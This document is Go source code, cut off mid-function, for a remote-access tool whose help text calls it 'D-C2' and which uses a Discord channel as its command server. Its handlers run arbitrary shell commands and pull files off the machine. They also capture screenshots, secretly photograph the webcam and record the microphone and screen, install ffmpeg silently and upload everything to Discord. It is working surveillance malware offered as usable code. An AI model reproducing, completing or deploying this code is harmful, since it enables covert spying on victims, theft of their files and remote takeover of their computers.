package main

import (
	"fmt"
	"image/png"
	"io"
	"log"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"syscall"
	"time"

	"github.com/bwmarrin/discordgo"
	"github.com/kbinani/screenshot"
)

func getTmpDir() string {
	dir := os.TempDir()
	if !strings.HasSuffix(dir, string(os.PathSeparator)) {
		dir += string(os.PathSeparator)
	}
	return dir
}

type discordLogWriter struct {
	base io.Writer
}

var (
	logStreamEnabled   bool
	logStreamSession   *discordgo.Session
	logStreamChannelID string
	logStreamMutex     sync.Mutex

	videoStateMutex sync.Mutex
	videoState      = struct {
		Status    string
		Cmd       *exec.Cmd
		Stdin     io.WriteCloser
		ChannelID string
		Source    string
		StartTime time.Time
		StopTime  time.Time
		Reason    string
	}{
		Status: "idle",
	}
)

func (w *discordLogWriter) Write(p []byte) (int, error) {
	n, err := w.base.Write(p)
	msg := strings.TrimSpace(string(p))
	if msg == "" {
		return n, err
	}
	logStreamMutex.Lock()
	enabled := logStreamEnabled
	s := logStreamSession
	ch := logStreamChannelID
	logStreamMutex.Unlock()
	if enabled && s != nil && ch != "" {
		if len(msg) > 1800 {
			msg = msg[:1800]
		}
		content := "```log\n" + msg + "\n```"
		go s.ChannelMessageSend(ch, content)
	}
	return n, err
}

func enableLogStreaming(s *discordgo.Session, channelID string) {
	logStreamMutex.Lock()
	logStreamEnabled = true
	logStreamSession = s
	logStreamChannelID = channelID
	logStreamMutex.Unlock()
}

func disableLogStreaming() {
	logStreamMutex.Lock()
	logStreamEnabled = false
	logStreamSession = nil
	logStreamChannelID = ""
	logStreamMutex.Unlock()
}

func ensureFFmpegAvailable(s *discordgo.Session, channelID string, ref *discordgo.MessageReference) bool {
	if _, err := exec.LookPath("ffmpeg"); err == nil {
		return true
	}
	log.Printf("FFMPEG not found in PATH")
	if runtime.GOOS != "windows" {
		if s != nil {
			s.ChannelMessageSendReply(channelID, "ffmpeg is required but not found in PATH.", ref)
		}
		return false
	}
	if s != nil {
		s.ChannelMessageSendReply(channelID, "ffmpeg not found. Attempting installation via winget on Windows...", ref)
	}
	wingetPath, err := exec.LookPath("winget")
	if err != nil {
		log.Printf("winget not found in PATH: %v", err)
		if s != nil {
			s.ChannelMessageSendReply(channelID, "winget is not available. Please install ffmpeg manually and ensure it is in PATH.", ref)
		}
		return false
	}
	log.Printf("Using winget at %s to install ffmpeg", wingetPath)
	cmd := exec.Command(wingetPath,
		"install",
		"--id=Gyan.FFmpeg",
		"-e",
		"--source=winget",
		"--accept-package-agreements",
		"--accept-source-agreements",
		"--silent",
	)
	out, err := cmd.CombinedOutput()
	if err != nil {
		log.Printf("winget ffmpeg install error: %v, output=%s", err, string(out))
		if s != nil {
			s.ChannelMessageSendReply(channelID, "ffmpeg installation via winget failed. Please install ffmpeg manually and ensure it is in PATH.", ref)
		}
		return false
	}
	log.Printf("winget ffmpeg install output: %s", string(out))
	if _, err := exec.LookPath("ffmpeg"); err == nil {
		log.Printf("FFMPEG available after winget install")
		return true
	}
	commonPaths := []string{
		`C:\Program Files\ffmpeg\bin`,
		`C:\Program Files (x86)\ffmpeg\bin`,
	}
	for _, p := range commonPaths {
		if fi, err := os.Stat(p); err == nil && fi.IsDir() {
			pathEnv := os.Getenv("PATH")
			if !strings.Contains(pathEnv, p) {
				newPath := p + ";" + pathEnv
				os.Setenv("PATH", newPath)
				log.Printf("Added %s to PATH for current process", p)
			}
			if _, err := exec.LookPath("ffmpeg"); err == nil {
				log.Printf("FFMPEG found after adding %s to PATH", p)
				return true
			}
		}
	}
	if s != nil {
		s.ChannelMessageSendReply(channelID, "ffmpeg installation attempted but binary is still not accessible. You may need to restart or adjust PATH manually.", ref)
	}
	return false
}

func detectWindowsDShowDevice(kind string) string {
	_, err := exec.LookPath("ffmpeg")
	if err != nil {
		log.Printf("DShow detect: ffmpeg not found in PATH: %v", err)
		return ""
	}
	out, err := exec.Command("ffmpeg", "-list_devices", "true", "-f", "dshow", "-i", "dummy").CombinedOutput()
	if err != nil {
		log.Printf("DShow detect: ffmpeg list_devices error: %v, output=%s", err, string(out))
		return ""
	}
	lines := strings.Split(string(out), "\n")
	header := "DirectShow " + kind + " devices"
	found := false
	var candidate string
	for _, raw := range lines {
		line := strings.TrimSpace(raw)
		if strings.Contains(line, header) {
			found = true
			continue
		}
		if strings.Contains(line, "\"") {
			start := strings.Index(line, "\"")
			end := strings.LastIndex(line, "\"")
			if start >= 0 && end > start {
				name := line[start+1 : end]
				if name == "" {
					continue
				}
				if kind == "audio" && !strings.Contains(line, "(audio)") && !strings.Contains(line, "DirectShow audio devices") {
					continue
				}
				if kind == "video" && !strings.Contains(line, "(video)") && !strings.Contains(line, "DirectShow video devices") {
					continue
				}
				device := kind + "=" + name
				if kind == "video" && strings.Contains(name, "Virtual Camera") {
					if candidate == "" {
						candidate = device
					}
					continue
				}
				if kind == "audio" && strings.Contains(name, "Stereo Mix") {
					if candidate == "" {
						candidate = device
					}
					continue
				}
				log.Printf("DShow detect: selected %s device %s", kind, device)
				return device
			}
		}
		if !found {
			continue
		}
	}
	if candidate != "" {
		log.Printf("DShow detect: using fallback %s device %s", kind, candidate)
		return candidate
	}
	log.Printf("DShow detect: no %s device found", kind)
	return ""
}

func handleScreenshot(s *discordgo.Session, channelID string, ref *discordgo.MessageReference) {
	n := screenshot.NumActiveDisplays()
	for i := 0; i < n; i++ {
		bounds := screenshot.GetDisplayBounds(i)
		img, _ := screenshot.CaptureRect(bounds)

		fileName := fmt.Sprintf("%s%d_%dx%d.png", getTmpDir(), i, bounds.Dx(), bounds.Dy())
		file, err := os.Create(fileName)
		if err != nil {
			log.Printf("SCREENSHOT create error for %s: %v", fileName, err)
			continue
		}
		err = png.Encode(file, img)
		if err != nil {
			log.Printf("SCREENSHOT encode error for %s: %v", fileName, err)
			file.Close()
			continue
		}
		file.Close()
		fi, err := os.Stat(fileName)
		if err != nil {
			log.Printf("SCREENSHOT stat error for %s: %v", fileName, err)
			continue
		}
		f, err := os.Open(fileName)
		if err != nil {
			log.Printf("SCREENSHOT open error for %s: %v", fileName, err)
			continue
		}
		fileStruct := &discordgo.File{Name: filepath.Base(fileName), Reader: f}
		fileArray := []*discordgo.File{fileStruct}
		_, sendErr := s.ChannelMessageSendComplex(channelID, &discordgo.MessageSend{Files: fileArray, Reference: ref})
		f.Close()
		if sendErr != nil {
			log.Printf("SCREENSHOT discord send error for %s: %v", fileName, sendErr)
			continue
		}
		log.Printf("SCREENSHOT completed file=%s size=%d bytes channel=%s", fileName, fi.Size(), channelID)
	}
}

func handleCameraSnapshot(s *discordgo.Session, channelID string, ref *discordgo.MessageReference) {
	fileName := fmt.Sprintf("%scam_%d.jpg", getTmpDir(), time.Now().UnixNano())
	var cmd *exec.Cmd
	device := os.Getenv("DC2_CAMERA_DEVICE")
	switch runtime.GOOS {
	case "windows":
		if device == "" {
			detected := detectWindowsDShowDevice("video")
			if detected != "" {
				device = detected
			} else {
				log.Printf("CAMERA no Windows video device detected; DC2_CAMERA_DEVICE not set")
				s.ChannelMessageSendReply(channelID, "No Windows camera device detected. Set DC2_CAMERA_DEVICE to a valid DirectShow video device name (list devices via: ffmpeg -list_devices true -f dshow -i dummy).", ref)
				return
			}
		}
		log.Printf("CAMERA windows device=%s", device)
		if !ensureFFmpegAvailable(s, channelID, ref) {
			log.Printf("CAMERA ffmpeg unavailable on Windows")
			return
		}
		cmd = exec.Command("ffmpeg", "-y", "-f", "dshow", "-i", device, "-vframes", "1", fileName)
	default:
		log.Printf("CAMERA feature not implemented for OS: %s", runtime.GOOS)
		s.ChannelMessageSendReply(channelID, "Camera feature does not exist yet for this OS (Windows only).", ref)
		return
	}
	out, err := cmd.CombinedOutput()
	if err != nil {
		msg := "Camera capture failed"
		if runtime.GOOS == "windows" {
			msg = msg + " (ensure ffmpeg is installed; set DC2_CAMERA_DEVICE to a valid DirectShow video device, list devices via: ffmpeg -list_devices true -f dshow -i dummy)"
		}
		if len(out) > 0 {
			if len(out) > 300 {
				out = out[:300]
			}
			msg = msg + ": " + string(out)
		} else {
			msg = msg + ": " + err.Error()
		}
		s.ChannelMessageSendReply(channelID, msg, ref)
		return
	}
	fi, err := os.Stat(fileName)
	if err != nil {
		log.Printf("CAMERA stat error for %s: %v", fileName, err)
		s.ChannelMessageSendReply(channelID, "Cannot stat captured file: "+err.Error(), ref)
		return
	}
	f, err := os.Open(fileName)
	if err != nil {
		s.ChannelMessageSendReply(channelID, "Cannot open captured file: "+err.Error(), ref)
		return
	}
	fileStruct := &discordgo.File{Name: filepath.Base(fileName), Reader: f}
	fileArray := []*discordgo.File{fileStruct}
	_, sendErr := s.ChannelMessageSendComplex(channelID, &discordgo.MessageSend{Files: fileArray, Reference: ref})
	f.Close()
	if sendErr != nil {
		log.Printf("CAMERA discord send error for %s: %v", fileName, sendErr)
		return
	}
	log.Printf("CAMERA completed file=%s size=%d bytes channel=%s", fileName, fi.Size(), channelID)
}

func handleMicRecord(s *discordgo.Session, channelID string, ref *discordgo.MessageReference, seconds int, destPath string) {
	log.Printf("MIC start: channel=%s seconds=%d destPath=%s os=%s", channelID, seconds, destPath, runtime.GOOS)
	if seconds <= 0 {
		seconds = 10
	}
	if seconds > 300 {
		seconds = 300
	}
	log.Printf("MIC normalized duration: %d seconds", seconds)
	path := destPath
	if path == "" {
		path = fmt.Sprintf("%smic_%d.m4a", getTmpDir(), time.Now().UnixNano())
	} else {
		ext := strings.ToLower(filepath.Ext(path))
		valid := ext == ".m4a" || ext == ".aac" || ext == ".mp3" || ext == ".wav" || ext == ".flac" || ext == ".ogg" || ext == ".opus" || ext == ".wma"
		if !valid {
			log.Printf("MIC non-audio extension %q requested, appending .m4a", ext)
			path = path + ".m4a"
		}
	}
	log.Printf("MIC resolved path: %s", path)
	durArg := fmt.Sprintf("%d", seconds)
	var cmd *exec.Cmd
	device := os.Getenv("DC2_MIC_DEVICE")
	switch runtime.GOOS {
	case "windows":
		if device == "" {
			detected := detectWindowsDShowDevice("audio")
			if detected != "" {
				device = detected
			} else {
				log.Printf("MIC no Windows audio device detected; DC2_MIC_DEVICE not set")
				s.ChannelMessageSendReply(channelID, "No Windows microphone device detected. Set DC2_MIC_DEVICE to a valid DirectShow audio device name (list devices via: ffmpeg -list_devices true -f dshow -i dummy).", ref)
				return
			}
		}
		log.Printf("MIC ffmpeg windows device=%s", device)
		if !ensureFFmpegAvailable(s, channelID, ref) {
			log.Printf("MIC ffmpeg unavailable on Windows")
			return
		}
		cmd = exec.Command("ffmpeg", "-y", "-f", "dshow", "-i", device, "-t", durArg, "-ac", "1", "-ar", "16000", "-b:a", "64k", path)
	default:
		log.Printf("MIC feature not implemented for OS: %s", runtime.GOOS)
		s.ChannelMessageSendReply(channelID, "Microphone recording feature does not exist yet for this OS (Windows only).", ref)
		return
	}
	log.Printf("MIC running ffmpeg: %v", cmd.Args)
	out, err := cmd.CombinedOutput()
	if err != nil {
		msg := "Microphone recording failed"
		log.Printf("MIC ffmpeg error: %v", err)
		if len(out) > 0 {
			log.Printf("MIC ffmpeg stderr: %s", string(out))
			if len(out) > 300 {
				out = out[:300]
			}
			msg = msg + ": " + string(out)
		} else {
			msg = msg + ": " + err.Error()
		}
		s.ChannelMessageSendReply(channelID, msg, ref)
		return
	}
	log.Printf("MIC ffmpeg completed successfully for %s", path)
	fi, err := os.Stat(path)
	if err != nil {
		log.Printf("MIC stat error for %s: %v", path, err)
		s.ChannelMessageSendReply(channelID, "Cannot stat recorded file: "+err.Error(), ref)
		return
	}
	log.Printf("MIC recorded file size: %d bytes", fi.Size())
	if fi.Size() == 0 {
		log.Printf("MIC zero-byte file at %s", path)
		s.ChannelMessageSendReply(channelID, "Recorded file is empty (0 bytes). Check microphone and ffmpeg settings.", ref)
		return
	}
	if fi.Size() >= 8388608 {
		log.Printf("MIC file too large to upload: size=%d", fi.Size())
		s.ChannelMessageSendReply(channelID, fmt.Sprintf("Recorded %d seconds to %s (file too large to upload, size=%d bytes).", seconds, path, fi.Size()), ref)
		return
	}
	f, err := os.Open(path)
	if err != nil {
		log.Printf("MIC open error for %s: %v", path, err)
		s.ChannelMessageSendReply(channelID, "Cannot open recorded file: "+err.Error(), ref)
		return
	}
	fileStruct := &discordgo.File{Name: filepath.Base(path), Reader: f}
	fileArray := []*discordgo.File{fileStruct}
	log.Printf("MIC sending file %s to channel=%s", path, channelID)
	_, sendErr := s.ChannelMessageSendComplex(channelID, &discordgo.MessageSend{
		Content:   fmt.Sprintf("Recorded %d seconds to %s", seconds, path),
		Files:     fileArray,
		Reference: ref,
	})
	f.Close()
	if sendErr != nil {
		log.Printf("MIC discord send error for %s: %v", path, sendErr)
		s.ChannelMessageSendReply(channelID, "Upload failed: "+sendErr.Error(), ref)
		return
	}
	log.Printf("MIC send completed for channel=%s path=%s size=%d bytes", channelID, path, fi.Size())
}

func handleVideoRecord(s *discordgo.Session, channelID string, ref *discordgo.MessageReference, source string, maxSizeMB int, maxParts int, totalSeconds int, quality string) {
	log.Printf("VIDEO start: channel=%s source=%s maxSizeMB=%d maxParts=%d totalSeconds=%d quality=%s os=%s", channelID, source, maxSizeMB, maxParts, totalSeconds, runtime.GOOS)
	videoStateMutex.Lock()
	if videoState.Status == "recording" || videoState.Status == "stopping" {
		videoStateMutex.Unlock()
		s.ChannelMessageSendReply(channelID, "Another recording is already in progress for this device.", ref)
		return
	}
	videoState.Status = "recording"
	videoState.ChannelID = channelID
	videoState.Source = source
	videoState.StartTime = time.Now()
	videoState.StopTime = time.Time{}
	videoState.Reason = ""
	videoState.Cmd = nil
	if videoState.Stdin != nil {
		videoState.Stdin.Close()
		videoState.Stdin = nil
	}
	videoStateMutex.Unlock()
	if runtime.GOOS != "windows" {
		s.ChannelMessageSendReply(channelID, "Video recording is only implemented for Windows.", ref)
		videoStateMutex.Lock()
		videoState.Status = "idle"
		videoStateMutex.Unlock()
		return
	}
	if maxSizeMB <= 0 {
		maxSizeMB = 2
	}
	if maxSizeMB > 8 {
		maxSizeMB = 8
	}
	if maxParts <= 0 {
		maxParts = 1
	}
	if maxParts > 30 {
		maxParts = 30
	}
	if quality != "low" && quality != "medium" && quality != "high" {
		quality = "medium"
	}
	if !ensureFFmpegAvailable(s, channelID, ref) {
		log.Printf("VIDEO ffmpeg unavailable on Windows")
		videoStateMutex.Lock()
		videoState.Status = "idle"
		videoState.Reason = "ffmpeg_unavailable"
		videoState.StopTime = time.Now()
		videoStateMutex.Unlock()
		return
	}
	var inputArgs []string
	if source == "camera" {
		videoDevice := os.Getenv("DC2_CAMERA_DEVICE")
		if videoDevice == "" {
			detected := detectWindowsDShowDevice("video")
			if detected != "" {
				videoDevice = detected
			} else {
				log.Printf("VIDEO camera: no Windows video device detected; DC2_CAMERA_DEVICE not set")
				s.ChannelMessageSendReply(channelID, "No Windows camera device detected. Set DC2_CAMERA_DEVICE to a valid DirectShow video device name.", ref)
				videoStateMutex.Lock()
				videoState.Status = "idle"
				videoState.Reason = "no_camera_device"
				videoState.StopTime = time.Now()
				videoStateMutex.Unlock()
				return
			}
		}
		audioDevice := os.Getenv("DC2_MIC_DEVICE")
		if audioDevice == "" {
			detectedAudio := detectWindowsDShowDevice("audio")
			if detectedAudio != "" {
				audioDevice = detectedAudio
			} else {
				log.Printf("VIDEO camera: no Windows audio device detected; DC2_MIC_DEVICE not set")
				s.ChannelMessageSendReply(channelID, "No Windows microphone device detected. Set DC2_MIC_DEVICE to a valid DirectShow audio device name.", ref)
				videoStateMutex.Lock()
				videoState.Status = "idle"
				videoState.Reason = "no_audio_device"
				videoState.StopTime = time.Now()
				videoStateMutex.Unlock()
				return
			}
		}
		log.Printf("VIDEO camera ffmpeg devices: video=%s audio=%s", videoDevice, audioDevice)
		inputArgs = []string{"-f", "dshow", "-i", videoDevice, "-f", "dshow", "-i", audioDevice}
	} else if source == "screen" {
		log.Printf("VIDEO screen ffmpeg source=desktop (gdigrab)")
		inputArgs = []string{"-f", "gdigrab", "-i", "desktop"}
	} else {
		log.Printf("VIDEO unsupported source: %s", source)
		s.ChannelMessageSendReply(channelID, "Unsupported video source. Use camera or screen.", ref)
		return
	}
	var crf string
	switch quality {
	case "low":
		crf = "30"
	case "high":
		crf = "23"
	default:
		crf = "28"
	}
	maxBytes := int64(maxSizeMB) * 1024 * 1024
	remainingSeconds := totalSeconds
	sessionStamp := time.Now().UnixNano()
	for part := 1; part <= maxParts; part++ {
		fileName := fmt.Sprintf("%srecord_%d_part%d.mp4", getTmpDir(), sessionStamp, part)
		args := []string{"-y"}
		args = append(args, inputArgs...)
		if remainingSeconds > 0 && maxParts > 0 {
			perPart := remainingSeconds / (maxParts - part + 1)
			if perPart < 5 {
				perPart = 5
			}
			args = append(args, "-t", fmt.Sprintf("%d", perPart))
			remainingSeconds -= perPart
			if remainingSeconds < 0 {
				remainingSeconds = 0
			}
		}
		args = append(args,
			"-vcodec", "libx264",
			"-preset", "veryfast",
			"-crf", crf,
			"-pix_fmt", "yuv420p",
			"-r", "25",
			"-acodec", "aac",
			"-b:a", "96k",
			"-ar", "44100",
			"-ac", "2",
			"-fs", fmt.Sprintf("%d", maxBytes),
			fileName,
		)
		log.Printf("VIDEO running ffmpeg part=%d: %v", part, args)
		cmd := exec.Command("ffmpeg", args...)
		stdin, _ := cmd.StdinPipe()
		videoStateMutex.Lock()
		if videoState.Status != "recording" || videoState.ChannelID != channelID {
			videoStateMutex.Unlock()
			if stdin != nil {
				stdin.Close()
			}
			return
		}
		videoState.Cmd = cmd
		videoState.Stdin = stdin
		videoStateMutex.Unlock()
		out, err := cmd.CombinedOutput()
		videoStateMutex.Lock()
		stopping := videoState.Status == "stopping"
		videoStateMutex.Unlock()
		if err != nil {
			log.Printf("VIDEO ffmpeg error on part %d: %v", part, err)
			if len(out) > 0 {
				log.Printf("VIDEO ffmpeg stderr part %d: %s", part, string(out))
			}
			if !stopping {
				msg := fmt.Sprintf("Video recording failed on part %d", part)
				if len(out) > 0 {
					if len(out) > 300 {
						out = out[:300]
					}
					msg = msg + ": " + string(out)
				} else {
					msg = msg + ": " + err.Error()
				}
				s.ChannelMessageSendReply(channelID, msg, ref)
				videoStateMutex.Lock()
				videoState.Status = "idle"
				videoState.Reason = "error"
				videoState.StopTime = time.Now()
				videoState.Cmd = nil
				if videoState.Stdin != nil {
					videoState.Stdin.Close()
					videoState.Stdin = nil
				}
				videoStateMutex.Unlock()
				return
			}
		}
		fi, statErr := os.Stat(fileName)
		if statErr != nil {
			log.Printf("VIDEO stat error for %s: %v", fileName, statErr)
			s.ChannelMessageSendReply(channelID, "Cannot stat recorded video file: "+statErr.Error(), ref)
			videoStateMutex.Lock()
			videoState.Status = "idle"
			videoState.Reason = "stat_error"
			videoState.StopTime = time.Now()
			videoState.Cmd = nil
			if videoState.Stdin != nil {
				videoState.Stdin.Close()
				videoState.Stdin = nil
			}
			videoStateMutex.Unlock()
			return
		}
		if fi.Size() == 0 {
			log.Printf("VIDEO zero-byte file at %s", fileName)
			s.ChannelMessageSendReply(channelID, "Recorded video file is empty (0 bytes).", ref)
			videoStateMutex.Lock()
			videoState.Status = "idle"
			videoState.Reason = "empty_file"
			videoState.StopTime = time.Now()
			videoState.Cmd = nil
			if videoState.Stdin != nil {
				videoState.Stdin.Close()
				videoState.Stdin = nil
			}
			videoStateMutex.Unlock()
			return
		}
		if fi.Size() > maxBytes {
			log.Printf("VIDEO file hit max size limit: size=%d bytes limit=%d", fi.Size(), maxBytes)
		}
		f, openErr := os.Open(fileName)
		if openErr != nil {
			log.Printf("VIDEO open error for %s: %v", fileName, openErr)
			s.ChannelMessageSendReply(channelID, "Cannot open recorded video file: "+openErr.Error(), ref)
			videoStateMutex.Lock()
			videoState.Status = "idle"
			videoState.Reason = "open_error"
			videoState.StopTime = time.Now()
			videoState.Cmd = nil
			if videoState.Stdin != nil {
				videoState.Stdin.Close()
				videoState.Stdin = nil
			}
			videoStateMutex.Unlock()
			return
		}
		log.Printf("VIDEO sending segment %d file %s size=%d bytes to channel=%s", part, fileName, fi.Size(), channelID)
		fileStruct := &discordgo.File{Name: filepath.Base(fileName), Reader: f}
		fileArray := []*discordgo.File{fileStruct}
		_, sendErr := s.ChannelMessageSendComplex(channelID, &discordgo.MessageSend{
			Content:   fmt.Sprintf("🎬 Video segment %d ready (%d bytes): %s", part, fi.Size(), filepath.Base(fileName)),
			Files:     fileArray,
			Reference: ref,
		})
		f.Close()
		if sendErr != nil {
			log.Printf("VIDEO discord send error for %s: %v", fileName, sendErr)
			s.ChannelMessageSendReply(channelID, "Upload failed for segment "+fmt.Sprint(part)+": "+sendErr.Error(), ref)
			videoStateMutex.Lock()
			videoState.Status = "idle"
			videoState.Reason = "upload_error"
			videoState.StopTime = time.Now()
			videoState.Cmd = nil
			if videoState.Stdin != nil {
				videoState.Stdin.Close()
				videoState.Stdin = nil
			}
			videoStateMutex.Unlock()
			return
		}
		log.Printf("VIDEO segment %d send completed for channel=%s path=%s", part, channelID, fileName)
		if stopping {
			break
		}
	}
	videoStateMutex.Lock()
	videoState.Status = "idle"
	if videoState.Reason == "" {
		videoState.Reason = "completed"
	}
	videoState.StopTime = time.Now()
	videoState.Cmd = nil
	if videoState.Stdin != nil {
		videoState.Stdin.Close()
		videoState.Stdin = nil
	}
	elapsed := videoState.StopTime.Sub(videoState.StartTime)
	reason := videoState.Reason
	videoStateMutex.Unlock()
	log.Printf("VIDEO finished channel=%s reason=%s duration=%s", channelID, reason, elapsed)
}

func handleVideoStop(s *discordgo.Session, channelID string, ref *discordgo.MessageReference) {
	videoStateMutex.Lock()
	if videoState.Status != "recording" || videoState.ChannelID != channelID {
		videoStateMutex.Unlock()
		s.ChannelMessageSendReply(channelID, "No active recording to stop for this device.", ref)
		return
	}
	videoState.Status = "stopping"
	videoState.Reason = "stopped_by_user"
	cmd := videoState.Cmd
	stdin := videoState.Stdin
	videoStateMutex.Unlock()
	s.ChannelMessageSendReply(channelID, "⏹ Stopping recording...", ref)
	go func() {
		if stdin != nil {
			_, _ = stdin.Write([]byte("q\n"))
			_ = stdin.Close()
		} else if cmd != nil && cmd.Process != nil {
			_ = cmd.Process.Kill()
		}
		time.Sleep(5 * time.Second)
		videoStateMutex.Lock()
		defer videoStateMutex.Unlock()
		if videoState.Status == "stopping" && videoState.Cmd != nil && videoState.Cmd.Process != nil {
			_ = videoState.Cmd.Process.Kill()
			videoState.Status = "idle"
			videoState.StopTime = time.Now()
			videoState.Reason = "stopped_timeout_kill"
			if videoState.Stdin != nil {
				videoState.Stdin.Close()
				videoState.Stdin = nil
			}
		}
	}()
}

func runCommandString(s *discordgo.Session, channelID string, ref *discordgo.MessageReference, cmdStr string) {
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("C:\\Windows\\System32\\cmd.exe", "/c", cmdStr)
	} else {
		cmd = exec.Command("/bin/bash", "-c", cmdStr)
	}
	out, err := cmd.CombinedOutput()
	if err != nil {
		out = append(out, 0x0a)
		out = append(out, []byte(err.Error())...)
	}

	outStr := string(out)
	if len(outStr) == 0 {
		s.ChannelMessageSendReply(channelID, "```bash\n<no output>\n```", ref)
	} else {
		runes := []rune(outStr)
		const maxChunk = 1800
		for start := 0; start < len(runes); start += maxChunk {
			end := start + maxChunk
			if end > len(runes) {
				end = len(runes)
			}
			chunk := string(runes[start:end])
			var resp strings.Builder
			resp.WriteString("```bash\n")
			resp.WriteString(chunk)
			resp.WriteString("\n```")
			if start == 0 && ref != nil {
				s.ChannelMessageSendReply(channelID, resp.String(), ref)
			} else {
				s.ChannelMessageSend(channelID, resp.String())
			}
		}
	}
}

func restartClient() error {
	exe, err := os.Executable()
	if err != nil {
		return err
	}
	if runtime.GOOS == "windows" {
		cmd := exec.Command(exe, os.Args[1:]...)
		cmd.Stdout = os.Stdout
		cmd.Stderr = os.Stderr
		cmd.Stdin = os.Stdin
		err := cmd.Start()
		if err != nil {
			return err
		}
		os.Exit(0)
		return nil
	}
	return syscall.Exec(exe, os.Args, os.Environ())
}

func handler(s *discordgo.Session, m *discordgo.MessageCreate) {
	if m.ChannelID != myChannelId || m.Author.ID == s.State.User.ID {
		return
	}

	s.MessageReactionAdd(m.ChannelID, m.ID, "🕐")
	flag := 0

	if strings.HasPrefix(m.Content, "🏃‍♂️") {
		cmdStr := strings.TrimSpace(strings.TrimPrefix(m.Content, "🏃‍♂️"))
		if cmdStr == "" {
			s.ChannelMessageSendReply(m.ChannelID, "Usage: 🏃‍♂️ <command>", m.Reference())
			goto done
		}
		runCommandString(s, m.ChannelID, m.Reference(), cmdStr)
		flag = 1
	} else if m.Content == "help" {
		help := "**D‑C2 Quick Help**\n\n" +
			"Use these simple controls in this device channel:\n\n" +
			"**Screenshots**\n" +
			"Use `/screenshot` or click the Screenshot button to capture the screen.\n\n" +
			"**Quick info**\n" +
			"Buttons for `whoami`, `id`, `hostname` and IP info run suitable commands on this OS:\n" +
			"- Windows: whoami, hostname, ipconfig\n" +
			"- Linux/macOS: whoami, id, hostname, ip addr\n\n" +
			"**Files**\n" +
			"Use `/download` and `/upload` or the 👇/☝️ emoji commands for file transfer.\n\n" +
			"**More controls**\n" +
			"Advanced commands are available via slash commands (see `/help`).\n\n" +
			"Send `help` or `/help` anytime to show this help again."
		components := []discordgo.MessageComponent{
			discordgo.ActionsRow{
				Components: []discordgo.MessageComponent{
					discordgo.Button{
						CustomID: "d2c_screenshot",
						Label:    "Screenshot",
						Emoji:    discordgo.ComponentEmoji{Name: "📸"},
						Style:    discordgo.PrimaryButton,
					},
				},
			},
			discordgo.ActionsRow{
				Components: []discordgo.MessageComponent{
					discordgo.Button{
						CustomID: "d2c_q_whoami",
						Label:    "whoami",
						Emoji:    discordgo.ComponentEmoji{Name: "🙍"},
						Style:    discordgo.SecondaryButton,
					},
					discordgo.Button{
						CustomID: "d2c_q_id",
						Label:    "id",
						Emoji:    discordgo.ComponentEmoji{Name: "🆔"},
						Style:    discordgo.SecondaryButton,
					},
					discordgo.Button{
						CustomID: "d2c_q_hostname",
						Label:    "hostname",
						Emoji:    discordgo.ComponentEmoji{Name: "💻"},
						Style:    discordgo.SecondaryButton,
					},
					discordgo.Button{
						CustomID: "d2c_q_ip",
						Label:    "ip info",
						Emoji:    discordgo.ComponentEmoji{Name: "🌐"},
						Style:    discordgo.SecondaryButton,
					},
				},
			},
			discordgo.ActionsRow{
				Components: []discordgo.MessageComponent{
					discordgo.Button{
						CustomID: "d2c_q_cwd",
						Label:    "cwd",
						Emoji:    discordgo.ComponentEmoji{Name: "📂"},
						Style:    discordgo.SecondaryButton,
					},
				},
			},
		}
		s.ChannelMessageSendComplex(m.ChannelID, &discordgo.MessageSend{
			Content:    help,
			Reference:  m.Reference(),
			Components: components,
		})
		flag = 1
	} else if m.Content == "📸" {
		log.Printf("SCREENSHOT emoji trigger: channel=%s", m.ChannelID)
		handleScreenshot(s, m.ChannelID, m.Reference())
		flag = 1
	} else if m.Content == "🎙" {
		log.Printf("MIC emoji trigger: channel=%s user=%s", m.ChannelID, m.Author.ID)
		handleMicRecord(s, m.ChannelID, m.Reference(), 10, "")
		flag = 1
	} else if m.Content == "📷" {
		log.Printf("CAMERA emoji trigger: channel=%s user=%s", m.ChannelID, m.Author.ID)
		handleCameraSnapshot(s, m.ChannelID, m.Reference())
		flag = 1
	} else if strings.HasPrefix(m.Content, "👇") {
		parts := strings.Fields(m.Content)
		if len(parts) < 2 {
			s.ChannelMessageSendReply(m.ChannelID, "Usage: 👇 <path>", m.Reference())
			goto done
		}
		fileName := strings.TrimSpace(parts[1])
		if strings.HasPrefix(fileName, "~/") {
			if home, err := os.UserHomeDir(); err == nil {
				fileName = home + string(os.PathSeparator) + fileName[2:]
			}
		}
		f, err := os.Open(fileName)
		if err != nil {
			s.ChannelMessageSendReply(m.ChannelID, "Cannot open file: "+fileName+" ("+err.Error()+")", m.Reference())
		} else {
			defer f.Close()
			fi, err := f.Stat()
			if err != nil {
				s.ChannelMessageSendReply(m.ChannelID, "Cannot stat file: "+fileName+" ("+err.Error()+")", m.Reference())
			} else {
				if fi.Size() < 8388608 {
					fileStruct := &discordgo.File{Name: filepath.Base(fileName), Reader: f}
					fileArray := []*discordgo.File{fileStruct}
					_, err = s.ChannelMessageSendComplex(m.ChannelID, &discordgo.MessageSend{
						Files:     fileArray,
						Reference: m.Reference(),
					})
					if err != nil {
						s.ChannelMessageSendReply(m.ChannelID, "Upload failed: "+err.Error(), m.Reference())
					} else {
						flag = 1
					}
				} else {
					s.ChannelMessageSendReply(m.ChannelID, "File is bigger than 8MB 😔", m.Reference())
				}
			}
		}
	} else if strings.HasPrefix(m.Content, "☝️") {
		parts := strings.Fields(m.Content)
		if len(parts) < 2 {
			s.ChannelMessageSendReply(m.ChannelID, "Usage: ☝️ <path> *attach", m.Reference())
			goto done
		}
		path := strings.TrimSpace(parts[1])
		if strings.HasPrefix(path, "~/") {
			if home, err := os.UserHomeDir(); err == nil {
				path = home + string(os.PathSeparator) + path[2:]
			}
		}
		if len(m.Attachments) > 0 {
			out, err := os.Create(path)
			if err != nil {
				s.ChannelMessageSendReply(m.ChannelID, "Cannot create file: "+path, m.Reference())
			} else {
				defer out.Close()
				resp, err := http.Get(m.Attachments[0].URL)
				if err != nil {
					s.ChannelMessageSendReply(m.ChannelID, "Download failed: "+err.Error(), m.Reference())
				} else {
					defer resp.Body.Close()
					_, _ = io.Copy(out, resp.Body)
					s.ChannelMessageSendReply(m.ChannelID, "Uploaded file to "+path, m.Reference())
					flag = 1
				}
			}
		}
	} else if m.Content == "🔁" {
		s.ChannelMessageSendReply(m.ChannelID, "🔁 Restarting client...", m.Reference())
		err := restartClient()
		if err != nil {
